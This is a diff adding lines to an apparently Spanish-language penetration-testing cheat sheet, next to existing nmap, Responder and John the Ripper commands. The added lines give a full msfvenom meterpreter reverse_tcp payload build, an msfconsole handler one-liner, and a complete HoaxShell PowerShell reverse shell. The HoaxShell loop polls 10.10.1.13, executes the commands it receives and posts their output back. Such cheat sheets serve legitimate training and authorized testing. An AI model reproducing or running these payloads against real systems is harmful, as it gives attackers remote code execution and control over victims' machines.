@@ -194,6 +194,17 @@ sgpt --chat vuln --shell "Perform vulnerability scan on target url ... with Nmap
 sudo responder -I eth0          # envenenamiento LLMNR/NBT-NS
 john hash.txt                   # crackeo de hash
 ```
+sudo docker run -d -p 80:80 reverse_shell_generator
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4444 -f exe -o reverse.exe
+
+msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 4444; exploit"
+getuid
+
+HoaxShell
+Powershell IEX 
+$s='10.10.1.13:444';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
+
+
 
 **Reverse shell / netcat**
 ```
